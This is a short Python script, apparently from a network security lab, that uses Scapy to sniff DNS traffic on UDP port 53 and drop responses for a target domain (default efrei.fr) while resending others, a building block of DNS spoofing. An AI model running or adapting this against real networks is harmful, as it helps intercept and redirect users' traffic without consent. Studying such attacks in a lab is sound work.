from scapy.all import *
import argparse

def dns_reply_filter(packet):
    """Filter DNS replies, blocking responses for the specified domain."""
    
    if packet.haslayer(DNS) and packet[DNS].qr == 1:  # It's a DNS response
        query_name = packet[DNS].qd.qname.decode('utf-8')
        
        if query_name == domain:
            print(f"Blocking legitimate DNS response for {query_name}")
            # Drop the packet to prevent the legitimate response from reaching the target
            return
        else:
            print(f"Allowing DNS response for {query_name}")
            # Forward the packet for other domains
            send(packet, verbose=False)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS Reply Filter Script")
    parser.add_argument("--domain", default="efrei.fr", help="Domain name to filter (default: efrei.fr)")
    
    args = parser.parse_args()
    
    domain = f"{args.domain}."
    
    print(f"Filtering DNS replies for domain {domain}...")
    
    # Sniff packets on UDP port 53 (DNS traffic)
    sniff(filter="udp port 53", prn=dns_reply_filter, store=0)

